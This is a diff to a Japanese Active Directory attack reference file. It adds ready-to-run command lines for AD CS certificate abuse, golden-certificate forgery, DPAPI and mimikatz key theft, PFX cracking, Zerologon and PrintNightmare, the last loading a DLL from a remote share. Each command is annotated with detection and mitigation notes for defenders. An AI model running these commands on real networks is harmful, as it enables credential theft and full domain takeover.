     "mitigate": "CVE-2024-49019のパッチ(2024年11月)を適用。V1テンプレートを廃止しV2以降へ移行、Enrollee-supplies-subjectのV1テンプレートのEnroll権限を撤去する。CAでApplication Policies注入を無効化するパッチ後構成を確認する。",
@@ -4032,6 +6621,33 @@ AD.I18N.ja.attacks = [
     "summary": "CAのDisableExtensionList等でszOID_NTDS_CA_SECURITY_EXT(SID拡張)がCA全体で無効化されていると、全テンプレートの発行証明書にSID紐付けが入らず、ESC9類似のUPN書換成りすましが広範に可能になる。",
     "how": "前提: CAレジストリのポリシーで szOID_NTDS_CA_SECURITY_EXT(1.3.6.1.4.1.311.25.2) がDisableExtensionListに登録され無効。手順は被害アカウントのUPNを administrator へ書換→任意の認証テンプレートを申請→UPNを戻す→SID拡張を欠く証明書でadministratorとして認証する。CA単位で影響するためESC9より広範。",
     "tools": "Certipy (find でESC16検出, account update, req, auth)",
+    "cmd": [
+      {
+        "tool": "Certipy",
+        "t": "CA全体でSID拡張が無効かを`-vulnerable`判定で検出。find実行はLDAP検索とCA接続を伴いDC/CA双方の認証ログに残る",
+        "q": "certipy find -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip 10.0.0.10 -stdout -vulnerable"
+      },
+      {
+        "tool": "Certipy",
+        "t": "被害アカウントのUPNをadministratorへ書換。LDAP変更イベント5136にuserPrincipalName属性の変更が残る",
+        "q": "certipy account update -u 'attacker@corp.local' -p 'Passw0rd!' -user 'victim' -upn 'administrator@corp.local'"
+      },
+      {
+        "tool": "Certipy",
+        "t": "書換えたUPNのまま認証用テンプレートを申請。CA側4886/4887にvictim名義の発行ログが残るがSID拡張が欠落する",
+        "q": "certipy req -u 'victim@corp.local' -p 'Passw0rd!' -ca 'corp-CA' -template 'User'"
+      },
+      {
+        "tool": "Certipy",
+        "t": "UPNを元へ復元し痕跡を薄める操作。短時間に同一アカウントへ2回のUPN変更(5136)が連続する点が検知の鍵",
+        "q": "certipy account update -u 'attacker@corp.local' -p 'Passw0rd!' -user 'victim' -upn 'victim@corp.local'"
+      },
+      {
+        "tool": "Certipy",
+        "t": "SID拡張の無いvictim名義証明書でadministratorとしてPKINIT認証。4768の証明書発行者情報と実際の権限昇格の不一致が手掛かり",
+        "q": "certipy auth -pfx victim.pfx -dc-ip 10.0.0.10"
+      }
+    ],
     "detect": "CAレジストリのDisableExtensionListにSIDセキュリティ拡張OIDが含まれていないか監査。SID拡張を欠く証明書での認証やUPN書換(5136)を監視する。",
     "events": "5136, 4886, 4887, 4768",
     "mitigate": "CAのDisableExtensionListからszOID_NTDS_CA_SECURITY_EXTを除去しSIDセキュリティ拡張を全テンプレートで発行。KB5014754の強制モードを適用し、CAレジストリ構成をベースライン監視する。",
@@ -4072,6 +6688,38 @@ AD.I18N.ja.attacks = [
     "summary": "デフォルトのMachineテンプレートで、コンピュータアカウントのdNSHostNameを既存DCのFQDNに書き換えて証明書を申請すると、CAが名前をDCと解決しDC$として認証できる証明書を発行してしまう。",
     "how": "前提: パッチ前(2022-05以前)環境、MachineAccountQuota>0または既存マシンアカウント制御。手順は certipy account create/update で新規/既存マシンのdNSHostNameを DC.domain.local に設定(SPN一意性チェック回避のため、攻撃者が制御する自マシンアカウント側の競合SPNを先に削除する。DC側オブジェクトの変更は不要かつ通常権限外)、Machineテンプレートを申請してDC名の証明書を取得、certipy auth でDC$のTGTを得てDCSyncに至る。",
     "tools": "Certipy (account create/update, req, auth), addcomputer.py, Powermad",
+    "cmd": [
+      {
+        "tool": "Certipy",
+        "t": "低権限で新規コンピュータアカウントを作成。既定のMachineAccountQuotaにより通常ユーザーの4741が初動痕跡",
+        "q": "certipy account create -u 'attacker@corp.local' -p 'Passw0rd!' -user 'ATTACKERPC$' -pass 'Passw0rd123!'"
+      },
+      {
+        "tool": "Certipy",
+        "t": "自マシンアカウントのdNSHostNameを既存DCのFQDNへ書換。LDAP変更イベント5136でdNSHostName属性がDC名に変わる点が決定的",
+        "q": "certipy account update -u 'ATTACKERPC$@corp.local' -p 'Passw0rd123!' -user 'ATTACKERPC$' -dns 'dc01.corp.local'"
+      },
+      {
+        "tool": "Certipy",
+        "t": "既定のMachineテンプレートを申請しDC名義の証明書を取得。CA側4886/4887の要求者名がDC以外の端末アカウントである点が異常",
+        "q": "certipy req -u 'ATTACKERPC$@corp.local' -p 'Passw0rd123!' -ca 'corp-CA' -template 'Machine'"
+      },
+      {
+        "tool": "Certipy",
+        "t": "取得証明書でDC$としてPKINIT認証しTGTを取得。4768の証明書発行者名とKerberosクライアント名の不整合が痕跡",
+        "q": "certipy auth -pfx dc01.pfx -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "Impacket",
+        "t": "Linux側からマシンアカウントを作成しdNSHostNameを直接指定。端末プロセスログは残らずDCの4741が起点",
+        "q": "addcomputer.py -computer-name 'ATTACKERPC$' -computer-pass 'Passw0rd123!' -dc-ip 10.0.0.10 corp.local/svc_user:'Passw0rd!'"
+      },
+      {
+        "tool": "Powermad",
+        "t": "PowerShell内でアカウント作成とdNSHostName書換を完結。4104のスクリプトブロックに関数名が残る",
+        "q": "New-MachineAccount -MachineAccount 'ATTACKERPC' -Password (ConvertTo-SecureString 'Passw0rd123!' -AsPlainText -Force) -Domain corp.local\nSet-MachineAccountAttribute -MachineAccount 'ATTACKERPC' -Attribute 'dNSHostName' -Value 'dc01.corp.local' -Domain corp.local"
+      }
+    ],
     "detect": "コンピュータアカウントのdNSHostName属性変更(5136)、特に既存DC名との衝突を監視。SIDセキュリティ拡張を検証しないパッチ前挙動での証明書発行(4887)とPKINIT(4768)を相関する。",
     "events": "5136, 4741/4742(コンピュータ作成/変更), 4886, 4887, 4768",
     "mitigate": "CVE-2022-26923パッチ(KB5014754)を適用しSIDセキュリティ拡張と強マッピングを強制。MachineAccountQuotaを0にし、dNSHostName/servicePrincipalNameの改変を制限、コンピュータアカウント作成を監査する。",
@@ -4112,6 +6760,33 @@ AD.I18N.ja.attacks = [
     "summary": "CAサーバからCAルート秘密鍵(+証明書)を窃取し、任意ユーザー用のクライアント認証証明書をオフラインで無制限に偽造する。CRL/失効の影響を受けず長期永続化できる究極のADCS永続化。",
     "how": "前提: CAサーバでの管理者権限。手順は certipy ca -backup または DPAPI/CAPI(mimikatz crypto::certificates /export)でCA秘密鍵をエクスポート(HSMの場合はESC12でPIN取得)、ForgeCert/certipy forge -ca-pfx ca.pfx -upn administrator@domain.local で任意ユーザー証明書を偽造、certipy authで認証。DCを再構築しても同一CA鍵なら偽造継続可能。",
     "tools": "Certipy (ca -backup / forge), ForgeCert, mimikatz (crypto::certificates /export, lsadump)",
+    "cmd": [
+      {
+        "tool": "Certipy",
+        "t": "CAサーバからルート証明書と秘密鍵をDCOM/RPC経由でバックアップ抽出。CA管理者権限操作としてCA側セキュリティログに残る",
+        "q": "certipy ca -u 'administrator@corp.local' -p 'Passw0rd!' -ca 'corp-CA' -target ca01.corp.local -backup"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "CA証明書がエクスポート不可設定の場合の代替。CryptoAPI/CNGをパッチしメモリ経由でCA秘密鍵を抽出する",
+        "q": "mimikatz.exe \"privilege::debug\" \"crypto::capi\" \"crypto::cng\" \"crypto::certificates /systemstore:local_machine /store:my /export\" exit"
+      },
+      {
+        "tool": "Certipy",
+        "t": "窃取したCA鍵で任意ユーザーの証明書をオフライン偽造。CRLに未記載のシリアル番号を持つ証明書としてPKINIT時に照合可能",
+        "q": "certipy forge -ca-pfx ca.pfx -ca-password 'Passw0rd!' -upn 'administrator@corp.local' -out administrator_forged.pfx"
+      },
+      {
+        "tool": "ForgeCert",
+        "t": "GhostPack製の別実装での偽造。CaCertPath/SubjectAltNameを含む特徴的な引数列がコマンドライン検知の主軸",
+        "q": "ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword 'Passw0rd!' --Subject \"CN=Administrator\" --SubjectAltName administrator@corp.local --NewCertPath admin_forged.pfx --NewCertPassword 'Passw0rd123!'"
+      },
+      {
+        "tool": "Certipy",
+        "t": "偽造証明書でPKINIT認証。CA再構築後も同一CA鍵を使う限り継続的に成立するため単発の証明書失効では防げない",
+        "q": "certipy auth -pfx administrator_forged.pfx -dc-ip 10.0.0.10"
+      }
+    ],
     "detect": "CAサーバでの秘密鍵エクスポート・DPAPI/CAPIアクセス、対話ログオン(4624/4672)を監視。偽造証明書はCAの発行DB(4887)に記録が無いのに認証(4768)される点が最大の検知手掛かり。発行DBに存在しないシリアルでのPKINIT認証を相関する。",
     "events": "4768, 4624, 4672, (CA発行DBとの突合)",
     "mitigate": "CA秘密鍵をHSMに格納しエクスポート不可に。CAサーバをTier0隔離しシェルアクセスを最小化。侵害時はCA鍵ローテーション(CA再構築)が必要なため二層PKI設計。発行DBに無いシリアルの認証を検知する仕組みを構築する。",
@@ -4152,6 +6827,33 @@ AD.I18N.ja.attacks = [
     "summary": "ログオン中のホスト上で、CryptoAPI(CAPI)/CNGのキーストアからユーザー・マシンの証明書と秘密鍵をメモリ経由でエクスポートする(エクスポート不可フラグを回避)。",
     "how": "前提: 対象ホストでのローカル管理者/SYSTEM権限。手順は mimikatz crypto::capi / crypto::cng でキープロバイダにパッチを当ててエクスポート不可の秘密鍵も抽出し、crypto::certificates /export /systemstore:local_machine でPFX化する。取得証明書で他ユーザー/マシン成りすまし認証に用いる。",
     "tools": "mimikatz (crypto::capi, crypto::cng, crypto::certificates /export), SharpDPAPI certificates",
+    "cmd": [
+      {
+        "tool": "Mimikatz",
+        "t": "ローカルCryptoAPIをパッチしエクスポート不可の秘密鍵を輸出可能へ変更。単体では正規操作と紛らわしく直後のcertificates /exportと相関させる",
+        "q": "mimikatz.exe \"crypto::capi\" exit"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "LSASSのKeyIsoサービスにパッチしCNG鍵をエクスポート可能化。SeDebugPrivilegeを要求するためprivilege::debugと対で現れる",
+        "q": "mimikatz.exe \"privilege::debug\" \"crypto::cng\" exit"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "対象ストアの証明書と秘密鍵をmimikatz固定パスワードのPFXへ一括出力。`/systemstore`と`/export`の組合せが決定的シグナル",
+        "q": "mimikatz.exe \"crypto::certificates /systemstore:local_machine /store:my /export\" exit"
+      },
+      {
+        "tool": "SharpDPAPI",
+        "t": "CryptUnprotectData()経由でユーザーコンテキストのまま証明書を復号。マスターキーファイルへの直接アクセスが不要なため検知が薄い",
+        "q": "SharpDPAPI.exe certificates /unprotect"
+      },
+      {
+        "tool": "certutil.exe",
+        "t": "OS標準LOLBinでの証明書ストア一括エクスポート。`-exportPFX`と`-p`パスワード指定の組合せが正規運用でも稀に使われるため文脈判定が必要",
+        "q": "certutil.exe -exportPFX -p \"Passw0rd!\" My 3f2504e0 user_export.pfx"
+      }
+    ],
     "detect": "LSASS/CNGへのハンドルアクセスや、CAPI/CNGプロバイダへのパッチング挙動(EDRのメモリ改ざん検知)を監視。証明書ストアからの大量エクスポートや、既知の攻撃ツール実行を検知する。",
     "events": "4656/4663(証明書ストア/鍵ファイルアクセス), EDRテレメトリ",
     "mitigate": "秘密鍵をエクスポート不可+ハードウェア保護(TPM/スマートカード)に。特権アクセスを最小化しEDRでcredential dumping/プロバイダ改ざんを検知・遮断。重要証明書は短命化する。",
@@ -4187,6 +6889,33 @@ AD.I18N.ja.attacks = [
     "summary": "ユーザーのDPAPIで保護された秘密鍵(%APPDATA%\\Microsoft\\Crypto配下)とマスターキーを復号し、ユーザー証明書の秘密鍵を窃取する。",
     "how": "前提: 対象ユーザーコンテキストまたはそのDPAPIマスターキー復号手段(ユーザーパスワード/ドメインバックアップキー)。手順は SharpDPAPI certificates /pvk または mimikatz dpapi::masterkey→dpapi::capi/cng で %APPDATA%\\Microsoft\\Crypto\\RSA(CNG) の暗号化鍵を復号しPFXを再構成、証明書認証に利用する。",
     "tools": "SharpDPAPI (certificates), mimikatz (dpapi::masterkey, dpapi::cng), Certipy (shadow/DPAPI関連)",
+    "cmd": [
+      {
+        "tool": "SharpDPAPI",
+        "t": "ログオン中ユーザーのDPAPI保護鍵から証明書秘密鍵を自動復元。%APPDATA%配下のマスターキーとRSA鍵ファイルへの連続アクセスが痕跡",
+        "q": "SharpDPAPI.exe certificates"
+      },
+      {
+        "tool": "SharpDPAPI",
+        "t": "ドメインDPAPIバックアップ鍵でパスワード非依存に全ユーザーのマスターキーを復号。DC上のバックアップ鍵取得自体が高シグナル",
+        "q": "SharpDPAPI.exe certificates /pvk:HvG1sAAAAAABAAAAAAAAAAAAAACU...(snip)"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "RPC経由でドメインバックアップ鍵を取得しマスターキーを復号。`/rpc`はDCへのBackuprKeyアクセスを伴い他手法より痕跡が残りやすい",
+        "q": "mimikatz.exe \"dpapi::masterkey /in:C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-...\\{guid} /rpc\" exit"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "復号済みマスターキーでCAPI形式の証明書秘密鍵を復元。パスに`Microsoft\\Crypto\\RSA`を含む点がファイルアクセス監視の手掛かり",
+        "q": "mimikatz.exe \"dpapi::capi /in:C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Crypto\\RSA\\S-1-5-21-...\\keyfile /masterkey:0a1b2c3d...\" exit"
+      },
+      {
+        "tool": "Certipy",
+        "t": "DPAPI復号を経由せずShadow Credentialsで直接PFXを取得する代替経路。msDS-KeyCredentialLinkへの書込がイベント5136に残る",
+        "q": "certipy shadow auto -u 'attacker@corp.local' -p 'Passw0rd!' -account 'victim'"
+      }
+    ],
     "detect": "%APPDATA%\\Microsoft\\Crypto および %APPDATA%\\Microsoft\\Protect(マスターキー)への異常アクセスを監視。ドメインDPAPIバックアップキー(BackupKey)の取得試行(4662 on Domain)を検知する。",
     "events": "4656/4663(Cryptoフォルダ), 4662(BackupKey), EDR",
     "mitigate": "秘密鍵をハードウェア(TPM/スマートカード)保護し平文DPAPI保存を避ける。DPAPIドメインバックアップキーへのアクセスをTier0に限定・監査。EDRでDPAPI悪用ツールを検知する。",
@@ -4222,6 +6951,33 @@ AD.I18N.ja.attacks = [
     "summary": "マシンDPAPI(SYSTEM)で保護されたマシン証明書の秘密鍵(%ALLUSERSPROFILE%\\Microsoft\\Crypto等)を復号し、コンピュータアカウントの証明書を窃取する。",
     "how": "前提: 対象ホストでのSYSTEM/管理者権限。手順は SharpDPAPI certificates /machine または mimikatz でマシンDPAPIマスターキー(LSA secret DPAPI_SYSTEM)を用いて machineキーを復号しPFX化、コンピュータアカウント認証(証明書ベース)に用いる。DC上なら高価値。",
     "tools": "SharpDPAPI (certificates /machine), mimikatz (dpapi), Certipy",
+    "cmd": [
+      {
+        "tool": "SharpDPAPI",
+        "t": "SYSTEMへトークン複製しDPAPI_SYSTEM LSAシークレットでマシン証明書鍵を復号。`/machine`はSeDebugPrivilege行使を伴う高シグナル操作",
+        "q": "SharpDPAPI.exe certificates /machine"
+      },
+      {
+        "tool": "SharpDPAPI",
+        "t": "既知マスターキー一覧を使う高速版。マスターキーファイル自体の事前取得(mimikatzのlsadump等)が先行して行われる",
+        "q": "SharpDPAPI.exe certificates /machine /mkfile:masterkeys.txt"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "SYSTEMトークンでマシンマスターキーを直接復号。`token::elevate`と`dpapi::masterkey /system`の組合せが高シグナル",
+        "q": "mimikatz.exe \"privilege::debug\" \"token::elevate\" \"dpapi::masterkey /in:C:\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User\\{guid} /system\" exit"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "マシンCNG鍵ストア配下のDC証明書秘密鍵を復元。パスに`ProgramData\\Microsoft\\Crypto\\Keys`を含みDC上での実行なら特に高価値",
+        "q": "mimikatz.exe \"dpapi::cng /in:C:\\ProgramData\\Microsoft\\Crypto\\Keys\\{guid} /masterkey:0a1b2c3d...\" exit"
+      },
+      {
+        "tool": "Certipy",
+        "t": "DPAPI経路を使わずDCのマシンアカウントへShadow Credentialsで直接証明書を発行させる代替。DC$への5136書込が唯一の手掛かり",
+        "q": "certipy shadow auto -u 'attacker@corp.local' -p 'Passw0rd!' -account 'DC01$'"
+      }
+    ],
     "detect": "マシンCryptoフォルダ(%ProgramData%\\Microsoft\\Crypto\\Keys等)へのアクセス、LSA secretsアクセス、SYSTEM権限での証明書エクスポートを監視する。",
     "events": "4656/4663, 4672, EDR",
     "mitigate": "マシン鍵をTPM保護、ローカル管理者権限を最小化。EDRでLSA/DPAPIアクセスを検知。DCなど高価値ホストの証明書は短命かつ厳格に管理する。",
@@ -4252,6 +7008,33 @@ AD.I18N.ja.attacks = [
     "summary": "ファイルシステム上に平文または弱パスワードで保存された証明書ファイル(.pfx/.p12/.pem/.key/.crt)を探索・回収して秘密鍵を入手する。",
     "how": "前提: 対象ホスト/共有への読取アクセス。手順はディスク・ファイル共有・バックアップ・スクリプト内を .pfx/.p12/.pem/.key 等で横断探索し、見つかったPFXのパスワードを空/辞書/ハッシュクラック(pfx2john)で解除、証明書認証に利用する。SYSVOLや自動化スクリプト、開発者PCが狙われやすい。",
     "tools": "Seatbelt, Snaffler, findstr/Get-ChildItem, pfx2john+john/hashcat, Certipy",
+    "cmd": [
+      {
+        "tool": "Seatbelt",
+        "t": "ユーザー/マシンの個人証明書ストアを列挙。単体では正規運用と紛らわしいためSnaffler等のファイル探索と時系列で相関させる",
+        "q": "Seatbelt.exe Certificates"
+      },
+      {
+        "tool": "Snaffler",
+        "t": "共有・ローカルドライブを横断し.pfx/.p12等の機微ファイルパターンを検索。`-s`標準出力と`-o`ログ保存の併用が典型形",
+        "q": "Snaffler.exe -s -o snaffler.log -v data"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "LOLBinでの手動探索。4104のスクリプトブロックに`*.pfx`や`*.p12`等の拡張子リストが残る",
+        "q": "Get-ChildItem -Path C:\\ -Include *.pfx,*.p12,*.pem,*.key -Recurse -ErrorAction SilentlyContinue"
+      },
+      {
+        "tool": "findstr.exe",
+        "t": "SYSVOL配下のスクリプト/設定ファイルに埋め込まれた秘密鍵文字列を検索。DC共有へのファイルアクセスとして4663/5145に残る",
+        "q": "findstr.exe /S /I /M \"BEGIN PRIVATE KEY\" \\\\corp.local\\SYSVOL\\corp.local\\*.*"
+      },
+      {
+        "tool": "pfx2john",
+        "t": "発見したPFXのパスワードをオフラインでクラック。攻撃対象ホストには痕跡が残らず持ち出し先での実行のため端末テレメトリでは検知不能",
+        "q": "python pfx2john.py stolen.pfx > pfx.hash\njohn --format=pfxng pfx.hash --wordlist=rockyou.txt"
+      }
+    ],
     "detect": "ファイル共有での証明書ファイル大量アクセス(5145)、Snaffler等の探索ツールの実行、機微拡張子への異常アクセスを監視する。",
     "events": "5145, 5140, 4663, EDR",
     "mitigate": "秘密鍵ファイルを平文・共有に置かず、強いパスフレーズ/シークレット管理(Vault)で保護。SYSVOLや共有をDLP/監査で棚卸し。開発・運用スクリプトから証明書を排除し短命化する。",
@@ -4287,6 +7070,28 @@ AD.I18N.ja.attacks = [
     "summary": "PKINITで取得したTGTに含まれるPAC_CREDENTIAL_INFO(NTLM資格情報)を利用して、証明書からユーザーのNTLMハッシュを回収する。証明書が失効/期限切れになってもハッシュで永続的に認証可能。",
     "how": "前提: 対象ユーザーの認証用証明書(PKINIT可能)を保有。手順は Rubeus asktgt /getcredentials /certificate:user.pfx または certipy auth -pfx user.pfx でPKINITしTGTを取得、応答のPAC_CREDENTIAL_INFOを復号してNTLMハッシュを抽出、以後はPtHで認証する。証明書→ハッシュへの資格変換で永続性を高める。",
     "tools": "Rubeus (asktgt /getcredentials), Certipy auth, gettgtpkinit.py+getnthash.py (PKINITtools)",
+    "cmd": [
+      {
+        "tool": "Rubeus",
+        "t": "PKINITでTGT取得後にU2Uを併用しNTLMハッシュを回収。`/getcredentials`が本技術唯一無二の識別文字列",
+        "q": "Rubeus.exe asktgt /user:victim /certificate:victim.pfx /password:'Passw0rd!' /getcredentials /nowrap"
+      },
+      {
+        "tool": "Certipy",
+        "t": "認証と同時にNTハッシュも自動抽出し表示。追加フラグ不要で証明書ベースの4768のみが手掛かり",
+        "q": "certipy auth -pfx victim.pfx -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "PKINITtools",
+        "t": "Linux側でTGTのASN.1構造ごと取得しPAC_CREDENTIAL_INFOを温存。端末プロセスログは残らずDCの4768の証明書発行者情報で見るしかない",
+        "q": "python gettgtpkinit.py corp.local/victim -cert-pfx victim.pfx -pfx-pass 'Passw0rd!' victim.ccache"
+      },
+      {
+        "tool": "PKINITtools",
+        "t": "gettgtpkinitで得たAS-REP鍵からU2U経由でNTLMハッシュを復号。`-key`に渡す鍵の受け渡しが前段コマンドとの相関点",
+        "q": "python getnthash.py corp.local/victim -key aabbccddeeff0011aabbccddeeff0011aabbccddeeff0011aabbccddeeff0011"
+      }
+    ],
     "detect": "証明書ベースのPKINIT認証(4768のCertificate Information欄あり)に続くNTLM認証(4776/4624 type3)の同一アカウントでの相関を監視する。予期しないPKINIT+NTLM併用を検知する。",
     "events": "4768(PKINIT), 4776, 4624",
     "mitigate": "認証用証明書の発行を最小化し短命化。侵害時はパスワードリセット2回(NTLMハッシュ無効化)を実施。KB5014754の強マッピングとPKINIT監視を整備し、証明書の失効・棚卸しを継続する。",
@@ -4317,6 +7122,28 @@ AD.I18N.ja.attacks = [
     "summary": "侵害したユーザー権限で正規に長期有効なクライアント認証証明書を発行しておき、パスワード変更後も証明書で認証を継続する永続化手法。",
     "how": "前提: 対象ユーザーのEnroll権限。手順は侵害中に certipy req / Certify request で該当ユーザーの認証証明書を発行・保管し、パスワードがリセットされても証明書の有効期間中は certipy auth でTGT取得・アクセスを継続する。UnPAC-the-hash(THEFT5)と組み合わせ再侵入を容易にする。",
     "tools": "Certipy, Certify, Rubeus",
+    "cmd": [
+      {
+        "tool": "Certipy",
+        "t": "侵害中に長期有効な認証証明書を確保。パスワードリセット後もCA側4887の発行ログのみが唯一の痕跡として残り続ける",
+        "q": "certipy req -u 'victim@corp.local' -p 'Passw0rd!' -ca 'corp-CA' -template 'User' -out victim_persist.pfx"
+      },
+      {
+        "tool": "Certify",
+        "t": "同種の証明書発行をC#実装で行う代替。`request --ca --template`のプロセス実行がコマンドライン検知の主軸",
+        "q": "Certify.exe request --ca corp-CA01.corp.local\\corp-CA --template User"
+      },
+      {
+        "tool": "Certipy",
+        "t": "パスワードがリセットされても証明書有効期間中はTGT取得を継続。4768の証明書ベース事前認証タイプが平常時との差分",
+        "q": "certipy auth -pfx victim_persist.pfx -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "証明書由来のTGTを継続更新し再認証の頻度自体を下げる。renew操作はTGT発行元イベントと結び付けて追跡する",
+        "q": "Rubeus.exe renew /ticket:victim_persist.kirbi /ptt"
+      }
+    ],
     "detect": "ユーザーによる予期しない証明書発行(4886/4887)、特にインシデント対応後の同アカウントでの証明書認証(4768)を監視。発行済み証明書の棚卸しを行う。",
     "events": "4886, 4887, 4768",
     "mitigate": "侵害アカウントは証明書も失効(revoke)させパスワードリセットと併せて対応。認証証明書の有効期間を短縮し、発行を監査。CRL/OCSPを機能させ失効を確実にする。",
@@ -4347,6 +7174,28 @@ AD.I18N.ja.attacks = [
     "summary": "侵害したコンピュータアカウント(特にDC)用の証明書を発行・保持し、マシンパスワードのローテーション後もマシンとして認証を継続する永続化。",
     "how": "前提: 対象マシンアカウント(またはSYSTEM)権限。手順はMachine/DomainControllerテンプレートで対象マシンの証明書を発行・保管し、以後 certipy auth でマシンアカウントのTGTを取得。DC$証明書ならDCSyncへ、マシンのマシンパスワードが自動更新されても証明書有効中は認証可能。",
     "tools": "Certipy, Certify, Rubeus",
+    "cmd": [
+      {
+        "tool": "Certipy",
+        "t": "DC$名義でDomainControllerテンプレートを申請し長期証明書を確保。CA側4887の発行ログが残り以後のマシンパスワード更新でも失効しない",
+        "q": "certipy req -u 'DC01$@corp.local' -p 'Passw0rd!' -ca 'corp-CA' -template 'DomainController' -out dc01_persist.pfx"
+      },
+      {
+        "tool": "Certify",
+        "t": "SYSTEMコンテキストで自マシンの証明書を発行するC#実装。`--machine`フラグの有無がユーザー/マシンどちらの永続化か判別する鍵",
+        "q": "Certify.exe request --ca corp-CA01.corp.local\\corp-CA --template Machine --machine"
+      },
+      {
+        "tool": "Certipy",
+        "t": "DC$のTGTを継続取得しDCSyncに到達可能な永続化。マシンパスワードの自動ローテーション後も証明書失効まで有効な点が高リスク",
+        "q": "certipy auth -pfx dc01_persist.pfx -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "取得済みマシン証明書からTGTを都度取得しセッションに注入。4768のクライアント名がコンピュータアカウントである点を監視",
+        "q": "Rubeus.exe asktgt /user:DC01$ /certificate:dc01_persist.pfx /password:'Passw0rd!' /ptt"
+      }
+    ],
     "detect": "マシンアカウントによる証明書発行(4887)とその後のPKINIT(4768)を監視。特にDC$以外の経路でのマシン証明書取得を異常検知する。",
     "events": "4886, 4887, 4768",
     "mitigate": "侵害マシンの証明書失効とマシンアカウントの再構築を実施。マシン証明書テンプレートの有効期間短縮と発行監査、失効(CRL)運用を徹底する。",
@@ -4377,6 +7226,33 @@ AD.I18N.ja.attacks = [
     "summary": "Netlogon(MS-NRPC)の暗号実装欠陥を突きDCのマシンアカウントパスワードを空に設定、ドメイン完全侵害に至る。",
     "how": "MS-NRPCのAES-CFB8で全ゼロIVが許容される欠陥を悪用。ComputeNetlogonCredentialで全ゼロのClientCredentialを送り続け、平均256回で認証成功する。NetrServerPasswordSet2でDC$のパスワードを空にリセットし、その状態でsecretsdumpによりDCSyncしてKRBTGTやDomain Adminハッシュを窃取する。ネットワーク到達性(445/TCP RPC)のみが前提でクレデンシャル不要。悪用後は元パスワードをAD/LSAへ書き戻さないとDCが認証不能になる点に注意。",
     "tools": "CVE-2020-1472 PoC(SecuraBV zerologon_tester/exploit)、impacket secretsdump.py、mimikatz(lsadump::zerologon)、nccgroup dirkjanm系スクリプト",
+    "cmd": [
+      {
+        "tool": "zerologon_tester",
+        "t": "DC名とIPのみで全ゼロNetlogon認証を約256回試行する検証ツール。成功時DC$のパスワードが空になる決定的な状態変化が残る",
+        "q": "zerologon_tester.py DC01 10.0.0.10"
+      },
+      {
+        "tool": "CVE-2020-1472",
+        "t": "dirkjanm版exploit本体。IPとNetBIOS名のみを渡しDC$のNetlogonパスワードを実際に空へリセットする",
+        "q": "cve-2020-1472-exploit.py 10.0.0.10 DC01"
+      },
+      {
+        "tool": "Impacket",
+        "t": "空パスワード化したDC$でDCSync。`-no-pass`とマシンアカウント指定の組み合わせがZerologon直後特有の痕跡",
+        "q": "secretsdump.py -just-dc -no-pass 'corp.local/DC01$'@10.0.0.10"
+      },
+      {
+        "tool": "restorepassword",
+        "t": "奪取したhexパスワードでDC$を元に戻す後始末。怠るとDCがドメイン参加不能になるため実行有無が侵害規模の目安になる",
+        "q": "restorepassword.py corp.local/dc01@dc01 -target-ip 10.0.0.10 -hexpass <original_password_hex>"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "2021年2月度の強制フェーズ更新が適用済みかを確認。未適用DCが1台でも残れば依然悪用可能",
+        "q": "Get-HotFix -Id KB4601345"
+      }
+    ],
     "detect": "短時間に同一マシンアカウントに対する認証失敗の急増とNetrServerPasswordSet2の連続呼び出しを監視する。DC$自身のパスワード変更イベント(4742)や、DCに対する匿名/空パスワードNetlogon認証が異常シグナル。SIEMでNetlogon RPCの異常頻度を相関させる。",
     "events": "4742(コンピュータアカウント変更), 4672, 5805, Netlogon 5827/5829/5830/5831, 4624(Logon Type 3)",
     "mitigate": "2020年8月パッチ適用が必須で、2021年2月の強制(Enforcement)モードを有効化する。FullSecureChannelProtectionレジストリを1に設定し脆弱な接続を拒否。DCのイベント5827/5829を監視して非準拠デバイスを洗い出す。",
@@ -4417,6 +7293,28 @@ AD.I18N.ja.attacks = [
     "summary": "Print SpoolerのRpcAddPrinterDriverEx経由で悪意あるドライバDLLをSYSTEM権限でロードさせRCE/権限昇格を行う。",
     "how": "MS-RPRN/MS-PAR経由でRpcAddPrinterDriverExを呼び、UNCパス(SMB共有)上の悪意あるドライバDLLをスプーラに読み込ませSYSTEMで実行。認証済み低権限ドメインユーザからDC上のスプーラを標的にすればドメイン権限昇格になる。1675はローカル権限昇格、34527はリモートコード実行の側面。Point and Print設定が緩いと非管理者でも成立する。",
     "tools": "cube0x0 CVE-2021-1675.py、SharpPrintNightmare、Invoke-Nightmare、mimikatz(misc::printnightmare)、impacket",
+    "cmd": [
+      {
+        "tool": "CVE-2021-1675.py",
+        "t": "cube0x0版RCE PoC。UNC共有上の悪意あるドライバDLLパスとドメイン資格情報がコマンドラインに残る",
+        "q": "CVE-2021-1675.py corp.local/svc_user:'Passw0rd!'@10.0.0.10 '\\\\10.0.0.20\\smb\\evil.dll'"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "ローカル版LPE。`Invoke-Nightmare`関数名と`-NewUser`が4104のスクリプトブロックログに残る",
+        "q": "Invoke-Nightmare -DriverName \"Xerox\" -NewUser \"svc_user\" -NewPassword \"Passw0rd!\""
+      },
+      {
+        "tool": "reg.exe",
+        "t": "Point and Print制限キーの設定確認。値が1でなければ非管理者でも野良ドライバをインストールできる",
+        "q": "reg query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint\" /v RestrictDriverInstallationToAdministrators"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "2021年7月度スプーラ修正の適用有無を確認",
+        "q": "Get-HotFix -Id KB5004947"
+      }
+    ],
